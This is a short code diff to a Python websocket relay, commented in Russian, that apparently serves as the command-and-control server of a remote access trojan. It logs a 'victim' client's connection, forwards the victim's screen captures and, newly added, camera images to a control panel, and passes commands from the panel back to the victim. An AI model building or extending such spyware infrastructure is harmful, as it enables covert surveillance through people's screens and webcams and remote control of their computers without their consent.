@@ -20,11 +20,13 @@ async def handler(websocket):
                 print("Клиент (жертва) подключен")
                 if control_ws:
                     await control_ws.send("CLIENT_CONNECTED")
-            elif message.startswith("IMG:"):
+            elif message.startswith("IMG:") or message.startswith("CAM:"):
+                # Пересылаем картинки экрана или камеры панели управления
                 if control_ws:
                     try: await control_ws.send(message)
                     except: control_ws = None
             elif message.startswith("CMD:"):
+                # Пересылаем команды клиенту
                 if client_ws:
                     try: await client_ws.send(message)
                     except: client_ws = None
